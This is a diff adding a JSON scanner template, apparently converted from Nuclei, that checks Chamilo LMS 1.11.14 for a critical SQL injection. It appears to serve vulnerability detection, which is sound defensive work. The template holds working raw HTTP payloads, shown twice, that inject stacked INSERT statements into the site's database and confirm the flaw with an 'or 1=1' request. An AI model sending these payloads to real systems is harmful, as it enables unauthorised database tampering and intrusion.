@@ -1,0 +1,119 @@
+{
+  "id": "chamilo-lms-sqli",
+  "name": "Chamilo 1.11.14 - SQL Injection",
+  "author": "undefl0w",
+  "severity": "CRITICAL",
+  "description": "Chamilo 1.1.14 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.",
+  "references": [
+    "https://packetstormsecurity.com/files/162572/Chamilo-LMS-1.11.14-Remote-Code-Execution.html"
+  ],
+  "tags": [
+    "chamilo",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-89",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /main/inc/ajax/extra_field.ajax.php?a\u003dsearch_options_from_tags HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ntype\u003dimage\u0026field_id\u003dimage\u0026tag\u003dimage\u0026from\u003dimage\u0026search\u003dimage\u0026options\u003d[\"test\u0027); INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16); INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,\u0027{{randstr}}\u0027); INSERT INTO extra_field_options(option_value) VALUES (\u0027{{randstr}}\u0027); INSERT INTO tag (id, tag, field_id,count) VALUES(16, \u0027{{randstr}}\u0027, 16,0) ON DUPLICATE KEY UPDATE     tag\u003d\u0027{{randstr}}\u0027, field_id\u003d16, count\u003d0;  -- \"]\n",
+        "POST /main/inc/ajax/extra_field.ajax.php?a\u003dsearch_options_from_tags HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ntype\u003dimage\u0026field_id\u003dimage\u0026tag\u003dimage\u0026from\u003dimage\u0026search\u003dimage\u0026options\u003d[\"test\u0027) or 1\u003d1 -- \"]\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body_2, \"{{randstr}}\")"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "chamilo-lms-sqli",
+    "info": {
+      "name": "Chamilo 1.11.14 - SQL Injection",
+      "author": "undefl0w",
+      "severity": "critical",
+      "description": "Chamilo 1.1.14 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.",
+      "reference": "https://packetstormsecurity.com/files/162572/Chamilo-LMS-1.11.14-Remote-Code-Execution.html",
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-89"
+      },
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "chamilo,sqli"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /main/inc/ajax/extra_field.ajax.php?a\u003dsearch_options_from_tags HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ntype\u003dimage\u0026field_id\u003dimage\u0026tag\u003dimage\u0026from\u003dimage\u0026search\u003dimage\u0026options\u003d[\"test\u0027); INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16); INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,\u0027{{randstr}}\u0027); INSERT INTO extra_field_options(option_value) VALUES (\u0027{{randstr}}\u0027); INSERT INTO tag (id, tag, field_id,count) VALUES(16, \u0027{{randstr}}\u0027, 16,0) ON DUPLICATE KEY UPDATE     tag\u003d\u0027{{randstr}}\u0027, field_id\u003d16, count\u003d0;  -- \"]\n",
+          "POST /main/inc/ajax/extra_field.ajax.php?a\u003dsearch_options_from_tags HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ntype\u003dimage\u0026field_id\u003dimage\u0026tag\u003dimage\u0026from\u003dimage\u0026search\u003dimage\u0026options\u003d[\"test\u0027) or 1\u003d1 -- \"]\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body_2, \"{{randstr}}\")"
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
